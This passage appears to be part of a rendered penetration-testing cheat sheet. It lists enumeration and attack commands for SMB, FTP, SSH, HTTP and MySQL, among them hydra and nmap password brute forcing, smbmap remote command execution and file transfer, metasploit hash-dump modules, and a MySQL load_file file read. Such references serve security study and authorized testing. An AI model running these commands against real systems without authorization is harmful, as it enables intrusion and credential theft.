+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">groups</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">existing</span><span class="w"> </span><span class="n">groups</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">services</span><span class="p">:</span><span class="w"> </span><span class="n">Attempts</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">domains</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">system</span><span class="p">,</span><span class="w"> </span><span class="n">along</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">their</span><span class="w"> </span><span class="n">policies</span><span class="o">.</span><span class="w"> </span><span class="n">This</span><span class="w"> </span><span class="n">generally</span><span class="w"> </span><span class="n">requires</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">ls</span><span class="p">:</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">after</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">shares</span><span class="p">,</span><span class="w"> </span><span class="n">will</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">list</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">each</span><span class="w"> </span><span class="n">shares</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smb</span><span class="o">-</span><span class="n">os</span><span class="o">-</span><span class="n">discovery</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">varous</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">system</span>
+</code></pre></div>
+<h4 id="smbmap">smbmap</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">guest</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Guest</span><span class="w"> </span><span class="n">shares</span><span class="w"> </span><span class="n">enumeration</span><span class="p">:</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="o">.</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Authenticated</span><span class="w"> </span><span class="n">shares</span><span class="w"> </span><span class="n">enumeration</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="o">&lt;</span><span class="n">command</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Command</span><span class="w"> </span><span class="n">execution</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">L</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">drives</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">&lt;</span><span class="n">drive</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Recursively</span><span class="w"> </span><span class="n">List</span><span class="w"> </span><span class="n">drive</span><span class="w"> </span><span class="n">contents</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">--</span><span class="n">upload</span><span class="w"> </span><span class="o">&lt;</span><span class="n">local</span><span class="w"> </span><span class="n">file</span><span class="o">&gt;</span><span class="w"> </span><span class="o">&lt;</span><span class="n">destination</span><span class="w"> </span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Upload</span><span class="w"> </span><span class="n">local</span><span class="w"> </span><span class="n">file</span>
+<span class="o">-</span><span class="w"> </span><span class="n">smbmap</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="o">&lt;</span><span class="n">user</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="o">&lt;</span><span class="n">password</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="w"> </span><span class="n">IP</span><span class="o">&gt;</span><span class="w"> </span><span class="o">--</span><span class="n">download</span><span class="w"> </span><span class="o">&lt;</span><span class="k">remote</span><span class="w"> </span><span class="n">file</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Download</span><span class="w"> </span><span class="k">remote</span><span class="w"> </span><span class="n">file</span>
+</code></pre></div>
+<h4 id="metasploit_1">metasploit</h4>
+<p>Useful modules: </p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_version</span><span class="p">:</span><span class="w"> </span><span class="n">enumerates</span><span class="w"> </span><span class="n">smb</span><span class="w"> </span><span class="n">server</span><span class="w"> </span><span class="n">version</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb2</span><span class="p">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">SMB2</span><span class="w"> </span><span class="n">scanner</span><span class="w"> </span><span class="n">module</span><span class="w"> </span><span class="n">simply</span><span class="w"> </span><span class="n">scans</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="k">remote</span><span class="w"> </span><span class="n">hosts</span><span class="w"> </span><span class="ow">and</span><span class="w"> </span><span class="n">determines</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">they</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">SMB2</span><span class="w"> </span><span class="n">protocol</span><span class="o">.</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_enumshares</span><span class="p">:</span><span class="w"> </span><span class="n">enumerates</span><span class="w"> </span><span class="n">shares</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">smb_login</span><span class="p">:</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">logins</span><span class="w"> </span><span class="n">performing</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">dictionary</span><span class="w"> </span><span class="n">attack</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">smb</span><span class="o">/</span><span class="n">pipe_auditor</span><span class="p">:</span><span class="w"> </span><span class="n">enumerates</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">named</span><span class="w"> </span><span class="n">pipes</span>\<span class="o">*</span>
+</code></pre></div>
+<p>*Note: smb uses <strong>pipes</strong> to connect services. A named pipe is a logical connection, similar to a TCP session, between a client and server. SMB clients access named pipe endpoints using the named pipe share named "IPC$".</p>
+<h4 id="nmblookup">nmblookup</h4>
+<p>nmblookup: NetBIOS over TCP/IP client used to lookup NetBIOS names</p>
+<div class="highlight"><pre><span></span><code>- nmblookup -A &lt;target ip&gt;
+</code></pre></div>
+<h4 id="smbclient">smbclient</h4>
+<p>smbclient: smb client for interacting with smb servers</p>
+<div class="highlight"><pre><span></span><code>- smbclient -L &lt;target ip&gt; -N // list shares as guest (-N == --no-pass)
+- smbclient //&lt;target&gt; -N // interact with the smb server
+</code></pre></div>
+<h4 id="rpcclient">rpcclient</h4>
+<p>When IPC$ is enabled, it's possible to connect to it using <strong>rpcclient</strong> and perform more enumeration</p>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">rpcclient</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="s2">""</span><span class="w"> </span><span class="o">-</span><span class="n">N</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="n">connect</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">IPC</span><span class="w"> </span><span class="n">service</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">enumdomusers</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">domain</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">enumdomgroups</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">groups</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">domain</span>
+<span class="w">    </span><span class="o">-</span><span class="w"> </span><span class="n">lookupnames</span><span class="w"> </span><span class="o">&lt;</span><span class="n">username</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">SID</span><span class="w"> </span><span class="n">correspondint</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">specified</span><span class="w"> </span><span class="n">username</span>
+</code></pre></div>
+<h4 id="enum4linux">enum4linux</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">os</span><span class="w"> </span><span class="n">information</span><span class="w"> </span><span class="n">about</span><span class="w"> </span><span class="n">target</span>
+<span class="o">-</span><span class="w"> </span><span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">S</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">shares</span>
+<span class="o">-</span><span class="w"> </span><span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">U</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">users</span>
+<span class="o">-</span><span class="w"> </span><span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">G</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">groups</span>
+<span class="o">-</span><span class="w"> </span><span class="n">enum4linux</span><span class="w"> </span><span class="o">-</span><span class="n">r</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="s2">"&lt;username"</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="s2">"&lt;password&gt;"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">authenticated</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">enumeration</span><span class="w"> </span><span class="n">via</span><span class="w"> </span><span class="nb nb-Type">RID</span><span class="w"> </span><span class="n">cycling</span>
+</code></pre></div>
+<h4 id="hydra">hydra</h4>
+<div class="highlight"><pre><span></span><code>- hydra -l &lt;username&gt; -P &lt;passwd wordlist&gt; &lt;target&gt; &lt;protocol&gt; // perform bruteforcing, on smb when protocol is smb
+</code></pre></div>
+<h3 id="ftp_1">FTP</h3>
+<h4 id="hydra_1">hydra</h4>
+<div class="highlight"><pre><span></span><code>- hydra -l &lt;username&gt; (or -L &lt;username wordlist&gt;) -P &lt;passwd wordlist&gt; &lt;target&gt; ftp // perform bruteforcing
+</code></pre></div>
+<h4 id="nmap_3">nmap</h4>
+<div class="highlight"><pre><span></span><code>- nmap --script ftp-brute --script-args userdb=&lt;username worldist&gt; -p 21 &lt;target&gt;
+- nmap --script ftp-anon -p 21 &lt;target&gt;
+</code></pre></div>
+<h3 id="ssh_1">SSH</h3>
+<h4 id="netcat">netcat</h4>
+<div class="highlight"><pre><span></span><code>nc &lt;target&gt; 22 // Banner grabbing
+</code></pre></div>
+<h4 id="nmap_4">nmap</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssh2</span><span class="o">-</span><span class="k">enum</span><span class="o">-</span><span class="n">algos</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">shows</span><span class="w"> </span><span class="n">all</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">algorithms</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">ssh</span><span class="w"> </span><span class="n">server</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">hostkey</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">ssh_hostkey</span><span class="o">=</span><span class="n">full</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="n">get</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">public</span><span class="w"> </span><span class="n">keys</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">every</span><span class="w"> </span><span class="n">available</span><span class="w"> </span><span class="n">algorithm</span><span class="p">,</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">existing</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">auth</span><span class="o">-</span><span class="n">methods</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="s2">"ssh.user=&lt;user&gt;"</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="p">:</span><span class="w"> </span><span class="k">enum</span><span class="w"> </span><span class="n">authorization</span><span class="w"> </span><span class="n">methods</span><span class="w"> </span><span class="n">used</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">specific</span><span class="w"> </span><span class="n">user</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">ssh</span><span class="o">-</span><span class="n">brute</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">userdb</span><span class="o">=&lt;</span><span class="n">username</span><span class="w"> </span><span class="n">worldist</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">22</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+</code></pre></div>
+<h4 id="hydra_2">hydra</h4>
+<div class="highlight"><pre><span></span><code>- hydra -l &lt;username&gt; (or -L &lt;username wordlist&gt;) -P &lt;passwd wordlist&gt; &lt;target&gt; ssh // perform bruteforcing
+</code></pre></div>
+<h4 id="metasploit_2">metasploit</h4>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/ssh/ssh_login
+</code></pre></div>
+<h3 id="http_1">HTTP</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">whatweb</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">technologies</span>
+<span class="o">-</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">send</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="n">http</span><span class="w"> </span><span class="n">request</span>
+<span class="o">-</span><span class="w"> </span><span class="n">dirb</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">directories</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">default</span><span class="w"> </span><span class="n">wordlist</span>
+<span class="o">-</span><span class="w"> </span><span class="n">browsh</span><span class="w"> </span><span class="o">--</span><span class="n">startup</span><span class="o">-</span><span class="n">url</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">cli</span><span class="w"> </span><span class="n">browser</span>
+<span class="o">-</span><span class="w"> </span><span class="n">lynx</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">cli</span><span class="w"> </span><span class="n">browser</span>
+<span class="o">-</span><span class="w"> </span><span class="n">curl</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+</code></pre></div>
+<h4 id="nmap_5">nmap</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">perform</span><span class="w"> </span><span class="n">banner</span><span class="w"> </span><span class="n">grabbing</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="k">enum</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">headers</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="o">.</span><span class="n">url</span><span class="o">-</span><span class="n">path</span><span class="o">=&lt;</span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">webdav</span><span class="o">-</span><span class="n">scan</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="w"> </span><span class="n">http</span><span class="o">-</span><span class="n">methods</span><span class="o">.</span><span class="n">url</span><span class="o">-</span><span class="n">path</span><span class="o">=&lt;</span><span class="n">path</span><span class="o">&gt;</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">80</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">detect</span><span class="w"> </span><span class="n">WebDAV</span><span class="w"> </span><span class="n">installations</span>
+</code></pre></div>
+<h4 id="metasploit_3">metasploit</h4>
+<div class="highlight"><pre><span></span><code><span class="k">-</span> auxiliary/scanner/http/http_version
+<span class="k">-</span> auxiliary/scanner/http/brute_dirs
+<span class="k">-</span> auxiliary/scanner/http/robots_txt
+</code></pre></div>
+<h3 id="mysql_1">MySQL</h3>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">select</span><span class="w"> </span><span class="n">load_file</span><span class="p">(</span><span class="s2">"&lt;path&gt;"</span><span class="p">);</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">Exfiltrate</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">content</span>
+</code></pre></div>
+<h4 id="metasploit_4">metasploit</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_writable_dirs</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">writable</span><span class="w"> </span><span class="n">dirs</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_file_enum</span><span class="p">:</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">files</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_mysqlhashdump</span><span class="p">:</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">hashes</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_schemadump</span><span class="p">:</span><span class="w"> </span><span class="n">dump</span><span class="w"> </span><span class="n">schema</span>
+<span class="o">-</span><span class="w"> </span><span class="n">auxiliary</span><span class="o">/</span><span class="n">scanner</span><span class="o">/</span><span class="n">mysql</span><span class="o">/</span><span class="n">mysql_login</span><span class="p">:</span><span class="w"> </span><span class="n">bruteforce</span><span class="w"> </span><span class="n">passwords</span>
+</code></pre></div>
+<h4 id="nmap_6">nmap</h4>
+<div class="highlight"><pre><span></span><code><span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">info</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">enumerate</span><span class="w"> </span><span class="n">infos</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="n">version</span><span class="p">,</span><span class="w"> </span><span class="n">capabilieties</span><span class="p">,</span><span class="w"> </span><span class="n">etc</span><span class="o">.</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">empty</span><span class="o">-</span><span class="n">password</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">check</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">db</span><span class="w"> </span><span class="n">allows</span><span class="w"> </span><span class="n">empty</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">logins</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">users</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"mysqluser='root',mysqlpass=''"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">emumerate</span><span class="w"> </span><span class="n">users</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
+<span class="o">-</span><span class="w"> </span><span class="n">nmap</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="mi">3306</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="w"> </span><span class="n">mysql</span><span class="o">-</span><span class="n">databases</span><span class="w"> </span><span class="o">--</span><span class="n">script</span><span class="o">-</span><span class="n">args</span><span class="o">=</span><span class="s2">"mysqluser='root',mysqlpass=''"</span><span class="w"> </span><span class="o">&lt;</span><span class="n">target</span><span class="o">&gt;</span><span class="w"> </span><span class="o">//</span><span class="w"> </span><span class="n">emumerate</span><span class="w"> </span><span class="n">dbs</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">known</span><span class="w"> </span><span class="n">credentials</span>
